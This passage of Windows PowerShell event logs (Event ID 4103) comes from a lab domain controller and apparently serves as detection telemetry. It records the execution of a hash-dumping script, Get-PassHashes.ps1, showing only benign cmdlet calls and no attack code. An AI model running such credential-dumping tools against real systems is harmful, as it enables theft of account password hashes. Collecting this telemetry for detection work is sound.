        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Out-Null
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 82
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Out-Null): "Out-Null"
ParameterBinding(Out-Null): name="InputObject"; value="0"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Text.Stringbuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="1024"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 80
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.462313900Z" />
    <EventRecordID>14221</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-5b3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 80
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Text.Stringbuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="1024"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Out-Null): "Out-Null"
ParameterBinding(Out-Null): name="InputObject"; value="0"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Out-Null
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 78
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.462014000Z" />
    <EventRecordID>14220</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-593b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Out-Null
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 78
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Out-Null): "Out-Null"
ParameterBinding(Out-Null): name="InputObject"; value="0"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Text.Stringbuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="1024"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 76
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.461845100Z" />
    <EventRecordID>14219</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-583b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 76
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Text.Stringbuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="1024"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Out-Null): "Out-Null"
ParameterBinding(Out-Null): name="InputObject"; value="0"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Out-Null
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 74
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.461480800Z" />
    <EventRecordID>14218</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-563b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Out-Null
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 74
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Out-Null): "Out-Null"
ParameterBinding(Out-Null): name="InputObject"; value="0"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Text.Stringbuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="1024"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 72
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.461298700Z" />
    <EventRecordID>14217</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-553b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 72
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Text.Stringbuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="1024"
</Data>
  </EventData>
</Event>

